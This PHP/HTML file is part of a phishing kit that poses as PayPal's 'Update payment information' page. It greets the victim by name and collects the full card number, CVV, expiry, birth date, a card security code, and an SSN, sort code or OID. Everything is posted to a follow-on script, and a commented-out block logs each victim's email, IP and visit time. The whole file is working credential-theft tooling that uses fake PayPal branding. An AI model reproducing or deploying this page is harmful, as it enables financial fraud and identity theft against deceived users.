<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##    ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##    ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### ########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##    ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##    ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
include("../M_files/config.php");
$ech = $_SESSION['ech'];

/*$rand = @$_GET['dispatch'];
$email = $_SESSION['email'];
date_default_timezone_set("Africa/Tunis");
$date           = date('d/m/Y', time());
$time           = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>PAYMENT</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$css = css_pay();
$js = js_pay();

if(@$_GET['id'] == "wrong") {
	$html = html_pay($css, $js, "<b style='color:red;'>Declined Card ,please check your information !</b>");

} else {
	$html = html_pay($css, $js);

}
die($html);*/
?>
<!Doctype html>
<html>
   <head>
      <meta charset="utf-8">
      <link rel="stylesheet" href="../M_css/M_payment.css"/>
      <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
      <title>Update payment information</title>
      <style type="text/css"></style>
      <script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script>
      <script type="text/javascript" src="../M_scripts/jquery.popup.js"></script>
	  <script type="text/javascript" src="../M_scripts/M_payment.js"></script>
	  <script type="text/javascript" src="../M_scripts/M_cookies.js"></script>
	  <META charset="utf-8">
   </head>
   <body>
     <div class="mahdi_1" >
			<div class="mahdi_2">
				<img src="../M_images/logo_paypal.png">
			</div>
		</div>
		
		<div class="mahdi_3" >
			<div class="mahdi_4">
				<h1>Welcome <?=$ech['fname'].$ech['lname']?>,</h1>
			</div>
			<form class="mahdi_51" action="post3.php" method="post" style="background:#fff;">
				<h3>Update your payment Information</h3>
				<p>Enter your payment information below<br>This is a very important step !<br>
				
				<table style="margin-left:10px;">
					<tr>
						<td>
                            <table >
                                <tr>
                                    <td align="center">
                                        <?php if (!empty($_SESSION['ech']['numcard1type'])) echo $_SESSION['ech']['numcard1type']; ?> 
                                    </td>
                                    <td style="font-size:20px;" align="center">
                                        <?php if (!empty($_SESSION['ech']['numcard1nums'])) echo "&nbsp;&nbsp;&nbsp;&nbsp;"."xxxx-xxxx-xxxx-".$_SESSION['ech']['numcard1nums']; ?> 
                                    </td>
                                    
                                </tr>
                            </table>
							
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_card" id="MAHDI_card" class="MAHDI_input" placeholder="Full Credit Card Number" maxlength="19" minlength="13">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_cardn" id="MAHDI_cardn" class="MAHDI_input" placeholder="Card Holder Name">
						</td>
					</tr>
					<tr>
						<td>
                            <?php $a= explode("/", $_SESSION['ech']['numcard1exp']);
                            $y = $a[1];
                            $m = $a[0];
                            ?>
							<input type="text" name="MAHDI_cvv" class="MAHDI_input" placeholder="CVV (CVC)" style="width:150px; margin-right:5px;" maxlength="5" minlength="3">

							<input type="text" name="MAHDI_mm" class="MAHDI_input" placeholder="MM" style="width:75px" value="<?=$m?>" maxlength="2" minlength="2">

							<input type="text" name="MAHDI_yy" class="MAHDI_input" placeholder="YY" style="width:75px" value="<?=$y?>" maxlength="4" minlength="4">
						</td>
					</tr>
					<tr>
						<td>
							<img src="../M_images/visa-mastercard-secure.png" style="float:right;">
							<h3>Secure Information</h3>
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_bd" id="MAHDI_bd" class="MAHDI_input" placeholder="Birth Date (MM-DD-YYYY)">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_pass" id="MAHDI_pass" class="MAHDI_input" placeholder="Secure Code">
						</td>
					</tr>
					<?php if ($country="US") { ?>
					<tr>
						<td>
							<input type="text" name="MAHDI_secp" id="MAHDI_ssn" class="MAHDI_input" placeholder="Social Security Number (XXX-XX-XXXX)">
						</td>
					</tr>
					<?php } elseif ($country="UK") { ?>
					<tr>
						<td>
							<input type="text" name="MAHDI_secp" id="MAHDI_srtc" class="MAHDI_input" placeholder="Sort Code (XX-XX-XX)">
						</td>
					</tr>
					<?php } elseif ($country="AU") { ?>
					<tr>
						<td>
							<input type="text" name="MAHDI_secp" id="MAHDI_OID" class="MAHDI_input" placeholder="OID">
						</td>
					</tr>
					<?php } ?>
				</table>
				<h3>Billing Address : </h3>
				<div style="padding:20px;padding-top:10px;margin-top:-10px;color:#555;font-size:18px;font-weight:">
					<span style="font-size:19px;"><?php echo $_SESSION['ech']['fullname']; ?></span><br>
					<?php echo $_SESSION['ech']['adrs1']." ".$_POST['adrs2']; ?><br>
					<?php echo $_SESSION['ech']['city']; ?><br>
					<?php echo $_SESSION['ech']['postalCode']; ?><br>
					<?php echo $_SESSION['ech']['country']; ?><br>
					<?php echo $_SESSION['ech']['phone']; ?><br>
				</div>
				<input type="submit" name="MAHDI_subm" class="MAHDI_submi"  id="MAHDI_submi"  value="Continue">
			</form>
			<div class="mahdi_52" >
			<h3>Your Wallet : </h3>
				<p>All your credit cards and your bank accounts are in a safe place .<br>
				This secure environment build by Paypal well make all your payments easier and faster !</p><div align="center"><img src="../M_images/card.png" > </div><br> 
				

			</div>
			<div class="mahdi_53">
				Copyright &copy; 1999-2015 P&alpha;yP&alpha;l.
			</div>
<script type="text/javascript">
			$("#MAHDI_submi").on("click", function(){

			   		if ($.trim($("input[name=MAHDI_card]").val()) === "") {  $("input[name=MAHDI_card]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_cardn]").val()) === "") {  $("input[name=MAHDI_cardn]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_cvv]").val()) === "") {  $("input[name=MAHDI_cvv]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_yy]").val()) === "") {  $("input[name=MAHDI_yy]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_mm]").val()) === "") {  $("input[name=MAHDI_mm]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_bd]").val()) === "") {  $("input[name=MAHDI_bd]").addClass("merror"); return false;}
			});
			$("input").change(function () {$(this).removeClass("merror");}).trigger("change");
		</script>
		</div>
   </body>
</html>